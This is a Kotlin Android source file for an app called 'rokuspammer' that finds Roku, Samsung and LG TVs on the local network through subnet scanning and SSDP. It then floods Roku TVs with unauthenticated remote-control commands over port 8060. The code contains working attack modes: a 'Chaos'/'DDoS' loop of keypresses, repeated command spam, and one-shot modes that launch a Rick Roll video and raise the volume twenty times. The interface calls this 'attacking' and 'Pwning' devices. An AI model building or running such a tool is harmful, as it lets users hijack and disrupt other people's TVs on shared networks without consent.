package com.example.rokuspammer

import android.os.*
import android.widget.*
import androidx.appcompat.app.AppCompatActivity
import kotlinx.coroutines.*
import java.io.OutputStreamWriter
import java.net.*
import java.util.*
import android.view.View
import android.view.animation.AnimationUtils
import android.os.Vibrator
import android.os.VibrationEffect
import android.graphics.Color
import android.view.ViewGroup
import android.graphics.Typeface
import android.text.SpannableString
import android.text.style.ForegroundColorSpan


class MainActivity : AppCompatActivity() {

    private lateinit var ipField: EditText
    private lateinit var scanButton: Button
    private lateinit var deviceSpinner: Spinner
    private lateinit var commandSpinner: Spinner
    private lateinit var delayInput: EditText
    private lateinit var startButton: Button
    private lateinit var stopButton: Button
    private lateinit var logOutput: TextView

    private var spamJob: Job? = null

    private val rokuCommands = listOf(
        "Chaos", // 💥 DDoS mode!
        "VolumeUp", "VolumeDown", "Home", "Back", "Select", "Info", "Up", "Down", "Left", "Right",
        "Launch Netflix", "Launch YouTube", "Launch Hulu", "Launch Disney+", "Launch Prime Video",
        "⚡ Thunder Mode",
        "🎣 Rick Roll Mode"
    )




    private val discoveredDevices = mutableMapOf<String, String>() // IP → Label

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        // Link UI elements
        ipField = findViewById(R.id.ipField)
        scanButton = findViewById(R.id.scanButton)
        deviceSpinner = findViewById(R.id.deviceSpinner)
        commandSpinner = findViewById(R.id.commandSpinner)
        delayInput = findViewById(R.id.delayInput)
        startButton = findViewById(R.id.startButton)
        stopButton = findViewById(R.id.stopButton)
        logOutput = findViewById(R.id.logOutput)
        // ✅ Load last saved IP and show device name
        val sharedPref = getSharedPreferences("roku", MODE_PRIVATE)
        val lastIp = sharedPref.getString("lastIp", null)
        if (!lastIp.isNullOrBlank()) {
            ipField.setText(lastIp)
            fetchDeviceInfo(lastIp)
        }
        // Populate command spinner
        val adapter = ArrayAdapter(this, R.layout.spinner_item, rokuCommands)
        adapter.setDropDownViewResource(R.layout.spinner_dropdown_item)
        commandSpinner.adapter = adapter

        scanButton.setOnClickListener {
            scanForSmartTVs()
            scanWithSSDP()
        }

        startButton.setOnClickListener { startSpamming() }
        stopButton.setOnClickListener { stopSpamming() }
    }

    private fun scanWithSSDP() {
        val foundDevices = mutableSetOf<String>()

        CoroutineScope(Dispatchers.IO).launch {
            try {
                val multicastAddress = InetAddress.getByName("239.255.255.250")
                val socket = DatagramSocket()
                socket.soTimeout = 2000

                val ssdpRequest = """
                M-SEARCH * HTTP/1.1
                HOST: 239.255.255.250:1900
                MAN: "ssdp:discover"
                MX: 2
                ST: ssdp:all

            """.trimIndent()

                val packetData = ssdpRequest.toByteArray()
                val packet = DatagramPacket(packetData, packetData.size, multicastAddress, 1900)

                log("🔍 Broadcasting SSDP discovery...")

                repeat(3) { socket.send(packet) } // send 3x to catch more devices

                val buffer = ByteArray(2048)

                val startTime = System.currentTimeMillis()

                while (System.currentTimeMillis() - startTime < 3000) {
                    try {
                        val responsePacket = DatagramPacket(buffer, buffer.size)
                        socket.receive(responsePacket)

                        val response = String(responsePacket.data, 0, responsePacket.length)
                        val senderIp = responsePacket.address.hostAddress

                        val server = Regex(
                            "SERVER: (.*)",
                            RegexOption.IGNORE_CASE
                        ).find(response)?.groupValues?.get(1)?.trim()
                        val st = Regex(
                            "ST: (.*)",
                            RegexOption.IGNORE_CASE
                        ).find(response)?.groupValues?.get(1)?.trim()
                        val location = Regex(
                            "LOCATION: (.*)",
                            RegexOption.IGNORE_CASE
                        ).find(response)?.groupValues?.get(1)?.trim()

                        val label = when {
                            server?.contains("roku", true) == true -> "Roku (SSDP)"
                            server?.contains("lg", true) == true || st?.contains(
                                "webos",
                                true
                            ) == true -> "LG TV (SSDP)"

                            server?.contains("samsung", true) == true || st?.contains(
                                "samsung",
                                true
                            ) == true -> "Samsung TV (SSDP)"

                            else -> "Unknown Device"
                        }

                        if (senderIp !in discoveredDevices) {
                            discoveredDevices[senderIp] = label
                            log("📡 SSDP: $label at $senderIp")
                        }


                    } catch (_: SocketTimeoutException) {
                        break
                    }
                }

                socket.close()

                if (discoveredDevices.isEmpty()) {
                    log("⚠️ No SSDP devices responded.")
                }

            } catch (e: Exception) {
                log("SSDP error: ${e.message}")
            }
        }
    }


    private fun fetchDeviceInfo(ip: String) {
        val url = "http://$ip:8060/query/device-info"
        Thread {
            try {
                val connection = URL(url).openConnection() as HttpURLConnection
                connection.requestMethod = "GET"
                val input = connection.inputStream.bufferedReader().use { it.readText() }

                val regex = Regex("<user-device-name>(.*?)</user-device-name>")
                val match = regex.find(input)
                val deviceName = match?.groupValues?.get(1) ?: "Roku"


            } catch (e: Exception) {
                runOnUiThread {
                    findViewById<TextView>(R.id.deviceInfoText).text = "Failed to fetch device info"
                }
            }
        }.start()
    }

    private fun getLocalSubnet(): String {
        val interfaces = NetworkInterface.getNetworkInterfaces()
        for (iface in interfaces) {
            for (addr in iface.inetAddresses) {
                if (!addr.isLoopbackAddress && addr is Inet4Address) {
                    val ip = addr.hostAddress
                    val subnet = ip.substringBeforeLast(".")
                    return subnet
                }
            }
        }
        return "192.168.0" // fallback
    }

    private fun scanForSmartTVs() {
        val subnet = getLocalSubnet()
        discoveredDevices.clear()

        log("Scanning $subnet.0/24...")

        CoroutineScope(Dispatchers.IO).launch {
            val jobs = (1..254).flatMap { i ->
                val ip = "$subnet.$i"
                listOf(
                    async {
                        // Roku: port 8060
                        try {
                            val url = URL("http://$ip:8060/query/device-info")
                            val conn = url.openConnection() as HttpURLConnection
                            conn.connectTimeout = 300
                            conn.readTimeout = 300
                            conn.requestMethod = "GET"
                            if (conn.responseCode == 200) {
                                val xml = conn.inputStream.bufferedReader().use { it.readText() }
                                val name = Regex("<user-device-name>(.*?)</user-device-name>")
                                    .find(xml)?.groupValues?.get(1) ?: "Roku"
                                discoveredDevices[ip] = "Roku: $name"
                                log("📺 Roku found: $name ($ip)")

                            }
                            conn.disconnect()
                        } catch (_: Exception) {
                        }
                    },
                    async {
                        // Samsung: port 8001
                        try {
                            val url = URL("http://$ip:8001/")
                            val conn = url.openConnection() as HttpURLConnection
                            conn.connectTimeout = 300
                            conn.readTimeout = 300
                            conn.requestMethod = "GET"
                            val serverHeader = conn.getHeaderField("Server")?.lowercase() ?: ""
                            if ("samsung" in serverHeader || conn.responseCode == 200) {
                                discoveredDevices[ip] = "Samsung TV"
                                log("📺 Samsung TV detected at $ip")
                            }
                            conn.disconnect()
                        } catch (_: Exception) {
                        }
                    },
                    async {
                        // LG: port 3000
                        try {
                            val url = URL("http://$ip:3000/")
                            val conn = url.openConnection() as HttpURLConnection
                            conn.connectTimeout = 300
                            conn.readTimeout = 300
                            conn.requestMethod = "GET"
                            val body = conn.inputStream.bufferedReader().readText().lowercase()
                            if ("webos" in body || conn.responseCode == 200) {
                                discoveredDevices[ip] = "LG WebOS TV"
                                log("📺 LG WebOS TV detected at $ip")
                            }
                            conn.disconnect()
                        } catch (_: Exception) {
                        }
                    }
                )
            }

            jobs.awaitAll()

            withContext(Dispatchers.Main) {
                if (discoveredDevices.isEmpty()) {
                    log("No smart TVs found.")
                } else {
                    val deviceList = discoveredDevices.map { (ip, name) -> "$name ($ip)" }
                    val multipleDevices = deviceList.size > 1

                    val displayList = mutableListOf("All Devices (broadcast)")
                    displayList.addAll(deviceList)

                    val adapter = object : ArrayAdapter<String>(
                        this@MainActivity,
                        R.layout.spinner_item,
                        displayList
                    ) {
                        override fun isEnabled(position: Int): Boolean {
                            val label = displayList[position]
                            return when {
                                label.startsWith("All Devices") && !multipleDevices -> false
                                !label.contains("Roku") -> false // ❌ Disable non-Roku
                                else -> true
                            }
                        }


                        override fun getView(
                            position: Int,
                            convertView: View?,
                            parent: ViewGroup
                        ): View {
                            val view = super.getView(position, convertView, parent) as TextView
                            val label = displayList[position]

                            val isDisabled =
                                !label.contains("Roku") || (label.startsWith("All Devices") && !multipleDevices)

                            view.setTextColor(if (isDisabled) Color.GRAY else Color.parseColor("#00FF00"))
                            view.setBackgroundColor(Color.BLACK)
                            view.textAlignment = View.TEXT_ALIGNMENT_CENTER
                            view.typeface = Typeface.MONOSPACE

                            return view
                        }


                        override fun getDropDownView(
                            position: Int,
                            convertView: View?,
                            parent: ViewGroup
                        ): View {
                            val view =
                                super.getDropDownView(position, convertView, parent) as TextView
                            val label = displayList[position]

                            val isDisabled =
                                !label.contains("Roku") || (label.startsWith("All Devices") && !multipleDevices)

                            view.setTextColor(if (isDisabled) Color.GRAY else Color.parseColor("#00FF00"))
                            view.setBackgroundColor(Color.parseColor("#222222"))
                            view.textAlignment = View.TEXT_ALIGNMENT_CENTER
                            view.typeface = Typeface.MONOSPACE

                            return view
                        }

                    }

                    deviceSpinner.adapter = adapter
                    deviceSpinner.setSelection(if (deviceList.size == 1) 1 else 0)

                    // ✅ Save first Roku IP only
                    val firstRoku =
                        discoveredDevices.entries.firstOrNull { it.value.startsWith("Roku") }?.key
                    if (firstRoku != null) {
                        val sharedPref = getSharedPreferences("roku", MODE_PRIVATE)
                        sharedPref.edit().putString("lastIp", firstRoku).apply()
                    }
                }
            }
        }
    }

    private fun safePost(urlStr: String, label: String = "") {
        try {
            URL(urlStr).apply {
                (openConnection() as HttpURLConnection).run {
                    requestMethod = "POST"
                    doOutput = true
                    connectTimeout = 1000
                    readTimeout = 3000
                    OutputStreamWriter(outputStream).use { it.write("") }
                    responseCode // ⛔ this might timeout — that’s okay
                    disconnect()
                }
            }
            if (label.isNotBlank()) log("✅ $label")
        } catch (e: SocketTimeoutException) {
            log("⚠️ $label — Roku did not respond, but command likely succeeded")
        } catch (e: Exception) {
            log("❌ $label failed: ${e.message}")
        }
    }


    private fun startSpamming() {
        val selectedItem = deviceSpinner.selectedItem?.toString()

        if (selectedItem != null && !selectedItem.contains("Roku")) {
            Toast.makeText(this, "Only Roku devices can be attacked (for now)", Toast.LENGTH_SHORT).show()
            return
        }

        val targetIps: List<String> =
            if (selectedItem?.startsWith("All Devices") == true) {
                (0 until deviceSpinner.adapter.count)
                    .map { deviceSpinner.adapter.getItem(it).toString() }
                    .filterNot { it.startsWith("All Devices") }
                    .filter { it.contains("Roku") }
                    .mapNotNull { Regex("\\((.*?)\\)").find(it)?.groupValues?.get(1) }
            } else {
                listOf(
                    Regex("\\((.*?)\\)").find(selectedItem ?: "")?.groupValues?.get(1)
                        ?: ipField.text.toString()
                )
            }

        if (targetIps.isEmpty()) {
            Toast.makeText(this, "Please enter or select a Roku IP", Toast.LENGTH_SHORT).show()
            return
        }

        fetchDeviceInfo(targetIps.first())

        val command = commandSpinner.selectedItem.toString()
        val delay = delayInput.text.toString().toLongOrNull() ?: 300L

        runOnUiThread {
            val selectedDisplay = deviceSpinner.selectedItem?.toString() ?: ipField.text.toString()
            val deviceName = Regex("^(.*?) \\(").find(selectedDisplay)?.groupValues?.get(1) ?: "Roku"
            val text = if (command == "Chaos") {
                "Obliterating: $deviceName"
            } else {
                "Pwning: $deviceName"
            }
            findViewById<TextView>(R.id.deviceInfoText).text = text
        }

        spamJob = CoroutineScope(Dispatchers.IO).launch {
            runOnUiThread {
                if (command == "Chaos") {
                    val anim = AnimationUtils.loadAnimation(this@MainActivity, R.anim.glitch)
                    startButton.startAnimation(anim)
                    startButton.text = "⚠️ CHAOS MODE ACTIVE"
                    val vibrator = getSystemService(VIBRATOR_SERVICE) as Vibrator
                    val pattern = longArrayOf(0, 100, 100)
                    val effect = VibrationEffect.createWaveform(pattern, 0)
                    vibrator.vibrate(effect)
                } else {
                    startButton.clearAnimation()
                }
            }

            // ⚡ One-shot mode: Thunder or Rick Roll — EXIT EARLY
            if (command == "⚡ Thunder Mode" || command == "🎣 Rick Roll Mode") {
                val videoId = if (command == "⚡ Thunder Mode") "v2AC41dglnM" else "dQw4w9WgXcQ"

                for (ip in targetIps) {
                    ensureActive()

                    // Step 1: Launch the video directly
                    safePost("http://$ip:8060/launch/837?contentID=$videoId", "🎬 Launching $videoId on $ip")

                    // Step 2: Wait for YouTube to fully load and show profile selection
                    delay(15000)
                    ensureActive()

                    // Step 3: Confirm profile with OK
                    safePost("http://$ip:8060/keypress/Select", "🕹️ Pressed Select to confirm profile")

                    // Step 4: Wait for video to start
                    delay(3000)
                    ensureActive()

                    // Step 5: Crank that volume up (20 times)
                    repeat(20) {
                        ensureActive()
                        safePost("http://$ip:8060/keypress/VolumeUp", "🔊 VolumeUp to $ip")
                        delay(500)
                    }
                }

                stopSpamming()
                return@launch



            }

            // 🌀 Loop only for Chaos or keypress modes
            try {
                while (isActive) {
                    when (command) {
                        "Chaos" -> {
                            for (cmd in rokuCommands.drop(1)) {
                                ensureActive()
                                for (ip in targetIps) {
                                    safePost("http://$ip:8060/keypress/$cmd", "Chaos: Sent $cmd to $ip")
                                }
                                delay(150)
                            }
                        }

                        else -> {
                            for (ip in targetIps) {
                                ensureActive()
                                safePost("http://$ip:8060/keypress/$command", "Sent $command to $ip")
                            }
                            delay(delay)
                        }
                    }
                }
            } catch (_: CancellationException) {}
        }
    }




    private fun stopSpamming() {
        runOnUiThread {
            startButton.clearAnimation()
            startButton.text = "START PWNING"
            findViewById<TextView>(R.id.deviceInfoText).text = "Idle"
            val vibrator = getSystemService(VIBRATOR_SERVICE) as Vibrator
            vibrator.cancel()
        }

        spamJob?.cancel()
        log("🛑 Spamming cancelled.")
    }

    private fun log(message: String) {
        runOnUiThread {
            val coloredText = SpannableString("$message\n")
            when {
                message.contains("Error", ignoreCase = true) -> {
                    coloredText.setSpan(ForegroundColorSpan(Color.RED), 0, message.length, 0)
                }

                message.contains("Sent", ignoreCase = true) || message.contains("Roku found") -> {
                    coloredText.setSpan(ForegroundColorSpan(Color.GREEN), 0, message.length, 0)
                }

                message.contains("No Roku", ignoreCase = true) || message.contains("Stopped", ignoreCase = true) -> {
                    coloredText.setSpan(ForegroundColorSpan(Color.YELLOW), 0, message.length, 0)
                }
            }

            logOutput.append(coloredText)

            val scrollView = findViewById<ScrollView>(R.id.logScroll)
            scrollView.post {
                scrollView.fullScroll(View.FOCUS_DOWN)
            }
        }
    }
}
